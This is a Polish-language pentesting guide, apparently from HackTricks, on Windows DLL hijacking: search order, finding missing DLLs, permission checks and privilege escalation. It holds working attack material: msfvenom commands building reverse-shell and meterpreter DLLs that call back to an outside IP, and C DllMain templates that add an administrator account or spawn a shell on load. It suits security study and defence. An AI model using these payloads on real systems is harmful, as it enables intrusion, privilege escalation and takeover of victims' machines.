# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}

## Basic Information

DLL Hijacking polega na manipulowaniu zaufaną aplikacją w celu załadowania złośliwego DLL. Termin ten obejmuje kilka taktyk, takich jak **DLL Spoofing, Injection i Side-Loading**. Jest głównie wykorzystywany do wykonywania kodu, osiągania trwałości i, rzadziej, eskalacji uprawnień. Mimo że skupiamy się tutaj na eskalacji, metoda hijackingu pozostaje spójna w różnych celach.

### Common Techniques

W przypadku DLL hijacking stosuje się kilka metod, z których każda ma swoją skuteczność w zależności od strategii ładowania DLL aplikacji:

1. **DLL Replacement**: Wymiana prawdziwego DLL na złośliwy, opcjonalnie z użyciem DLL Proxying w celu zachowania funkcjonalności oryginalnego DLL.
2. **DLL Search Order Hijacking**: Umieszczanie złośliwego DLL w ścieżce wyszukiwania przed legalnym, wykorzystując wzór wyszukiwania aplikacji.
3. **Phantom DLL Hijacking**: Tworzenie złośliwego DLL, który aplikacja załadowuje, myśląc, że jest to nieistniejący wymagany DLL.
4. **DLL Redirection**: Modyfikowanie parametrów wyszukiwania, takich jak `%PATH%` lub pliki `.exe.manifest` / `.exe.local`, aby skierować aplikację do złośliwego DLL.
5. **WinSxS DLL Replacement**: Zastępowanie legalnego DLL złośliwym odpowiednikiem w katalogu WinSxS, metoda często związana z DLL side-loading.
6. **Relative Path DLL Hijacking**: Umieszczanie złośliwego DLL w katalogu kontrolowanym przez użytkownika z skopiowaną aplikacją, przypominając techniki Binary Proxy Execution.

## Finding missing Dlls

Najczęstszym sposobem na znalezienie brakujących DLL w systemie jest uruchomienie [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) z sysinternals, **ustawiając** **następujące 2 filtry**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

i pokazując tylko **Aktywność systemu plików**:

![](<../../../images/image (153).png>)

Jeśli szukasz **brakujących dll w ogóle**, powinieneś **pozostawić** to działające przez kilka **sekund**.\
Jeśli szukasz **brakującego dll w konkretnym pliku wykonywalnym**, powinieneś ustawić **inny filtr, taki jak "Nazwa procesu" "zawiera" "\<nazwa exec>", wykonać go i zatrzymać rejestrowanie zdarzeń**.

## Exploiting Missing Dlls

Aby eskalować uprawnienia, najlepszą szansą, jaką mamy, jest możliwość **napisania dll, który proces z uprawnieniami spróbuje załadować** w jednym z **miejsc, gdzie będzie szukany**. Dlatego będziemy mogli **napisać** dll w **folderze**, w którym **dll jest wyszukiwany przed** folderem, w którym znajduje się **oryginalny dll** (dziwny przypadek), lub będziemy mogli **napisać w jakimś folderze, gdzie dll będzie wyszukiwany**, a oryginalny **dll nie istnieje** w żadnym folderze.

### Dll Search Order

**W dokumentacji** [**Microsoftu**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **możesz znaleźć, jak DLL są ładowane konkretnie.**

**Aplikacje Windows** szukają DLL, podążając za zestawem **zdefiniowanych ścieżek wyszukiwania**, przestrzegając określonej sekwencji. Problem z DLL hijacking pojawia się, gdy złośliwy DLL jest strategicznie umieszczany w jednym z tych katalogów, zapewniając, że zostanie załadowany przed autentycznym DLL. Rozwiązaniem, aby temu zapobiec, jest upewnienie się, że aplikacja używa ścieżek bezwzględnych, gdy odnosi się do wymaganych DLL.

Możesz zobaczyć **kolejność wyszukiwania DLL w systemach 32-bitowych** poniżej:

1. Katalog, z którego aplikacja została załadowana.
2. Katalog systemowy. Użyj funkcji [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya), aby uzyskać ścieżkę do tego katalogu. (_C:\Windows\System32_)
3. Katalog systemowy 16-bitowy. Nie ma funkcji, która uzyskuje ścieżkę do tego katalogu, ale jest on przeszukiwany. (_C:\Windows\System_)
4. Katalog Windows. Użyj funkcji [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya), aby uzyskać ścieżkę do tego katalogu. (_C:\Windows_)
5. Bieżący katalog.
6. Katalogi wymienione w zmiennej środowiskowej PATH. Należy zauważyć, że nie obejmuje to ścieżki per-aplikacji określonej przez klucz rejestru **App Paths**. Klucz **App Paths** nie jest używany przy obliczaniu ścieżki wyszukiwania DLL.

To jest **domyślna** kolejność wyszukiwania z włączonym **SafeDllSearchMode**. Gdy jest wyłączony, bieżący katalog awansuje na drugie miejsce. Aby wyłączyć tę funkcję, utwórz wartość rejestru **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** i ustaw ją na 0 (domyślnie jest włączona).

Jeśli funkcja [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) jest wywoływana z **LOAD_WITH_ALTERED_SEARCH_PATH**, wyszukiwanie rozpoczyna się w katalogu modułu wykonywalnego, który **LoadLibraryEx** ładuje.

Na koniec zauważ, że **dll może być załadowany, wskazując bezwzględną ścieżkę zamiast tylko nazwy**. W takim przypadku ten dll **będzie wyszukiwany tylko w tej ścieżce** (jeśli dll ma jakieś zależności, będą one wyszukiwane tak, jakby były ładowane tylko po nazwie).

Istnieją inne sposoby na zmianę sposobów zmiany kolejności wyszukiwania, ale nie zamierzam ich tutaj wyjaśniać.

#### Exceptions on dll search order from Windows docs

Niektóre wyjątki od standardowej kolejności wyszukiwania DLL są zauważane w dokumentacji Windows:

- Gdy napotkany jest **DLL, który dzieli swoją nazwę z już załadowanym w pamięci**, system pomija zwykłe wyszukiwanie. Zamiast tego wykonuje sprawdzenie przekierowania i manifestu, zanim domyślnie przejdzie do DLL już w pamięci. **W tej sytuacji system nie przeprowadza wyszukiwania DLL**.
- W przypadkach, gdy DLL jest rozpoznawany jako **znany DLL** dla bieżącej wersji Windows, system wykorzysta swoją wersję znanego DLL, wraz z wszelkimi jego zależnymi DLL, **pomijając proces wyszukiwania**. Klucz rejestru **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** zawiera listę tych znanych DLL.
- Jeśli **DLL ma zależności**, wyszukiwanie tych zależnych DLL jest przeprowadzane tak, jakby były wskazywane tylko przez swoje **nazwy modułów**, niezależnie od tego, czy początkowy DLL został zidentyfikowany przez pełną ścieżkę.

### Escalating Privileges

**Wymagania**:

- Zidentyfikuj proces, który działa lub będzie działał z **innymi uprawnieniami** (ruch poziomy lub boczny), który **nie ma DLL**.
- Upewnij się, że **dostęp do zapisu** jest dostępny dla dowolnego **katalogu**, w którym **DLL** będzie **wyszukiwany**. To miejsce może być katalogiem pliku wykonywalnego lub katalogiem w ścieżce systemowej.

Tak, wymagania są skomplikowane do znalezienia, ponieważ **domyślnie jest to dość dziwne, aby znaleźć uprawniony plik wykonywalny bez dll** i jest jeszcze **dziwniejsze, aby mieć uprawnienia do zapisu w folderze ścieżki systemowej** (domyślnie nie możesz). Ale w źle skonfigurowanych środowiskach jest to możliwe.\
W przypadku, gdy masz szczęście i spełniasz wymagania, możesz sprawdzić projekt [UACME](https://github.com/hfiref0x/UACME). Nawet jeśli **głównym celem projektu jest obejście UAC**, możesz tam znaleźć **PoC** dla Dll hijacking dla wersji Windows, której możesz użyć (prawdopodobnie zmieniając tylko ścieżkę folderu, w którym masz uprawnienia do zapisu).

Zauważ, że możesz **sprawdzić swoje uprawnienia w folderze**, wykonując:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
I **sprawdź uprawnienia wszystkich folderów w PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Możesz również sprawdzić importy pliku wykonywalnego oraz eksporty dll za pomocą:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Aby uzyskać pełny przewodnik na temat **wykorzystania Dll Hijacking do eskalacji uprawnień** z uprawnieniami do zapisu w **folderze System Path**, sprawdź:

{{#ref}}
writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

### Narzędzia automatyczne

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)sprawdzi, czy masz uprawnienia do zapisu w jakimkolwiek folderze w system PATH.\
Inne interesujące narzędzia automatyczne do odkrywania tej podatności to **funkcje PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ i _Write-HijackDll._

### Przykład

W przypadku znalezienia scenariusza, który można wykorzystać, jedną z najważniejszych rzeczy, aby skutecznie go wykorzystać, będzie **utworzenie dll, która eksportuje przynajmniej wszystkie funkcje, które wykonywalny plik będzie z niej importować**. W każdym razie, pamiętaj, że Dll Hijacking jest przydatny do [eskalacji z poziomu Medium Integrity do High **(obejście UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) lub z [**High Integrity do SYSTEM**](../index.html#from-high-integrity-to-system)**.** Możesz znaleźć przykład **jak stworzyć ważną dll** w tym badaniu dotyczącym dll hijacking skoncentrowanym na dll hijacking do wykonania: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Ponadto, w **następnej sekcji** znajdziesz kilka **podstawowych kodów dll**, które mogą być przydatne jako **szablony** lub do stworzenia **dll z niepotrzebnymi funkcjami eksportowanymi**.

## **Tworzenie i kompilowanie Dlls**

### **Dll Proxifying**

W zasadzie **Dll proxy** to dll zdolna do **wykonywania twojego złośliwego kodu po załadowaniu**, ale także do **ekspozycji** i **działania** zgodnie z **oczekiwaniami** poprzez **przekazywanie wszystkich wywołań do prawdziwej biblioteki**.

Za pomocą narzędzia [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) lub [**Spartacus**](https://github.com/Accenture/Spartacus) możesz faktycznie **wskazać wykonywalny plik i wybrać bibliotekę**, którą chcesz proxify i **wygenerować proxified dll** lub **wskazać Dll** i **wygenerować proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Zdobądź meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Utwórz użytkownika (x86, nie widziałem wersji x64):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Twoje własne

Zauważ, że w kilku przypadkach Dll, który kompilujesz, musi **eksportować kilka funkcji**, które będą ładowane przez proces ofiary; jeśli te funkcje nie istnieją, **plik binarny nie będzie w stanie ich załadować** i **eksploit się nie powiedzie**.
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## Odniesienia

- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)


{{#include ../../../banners/hacktricks-training.md}}
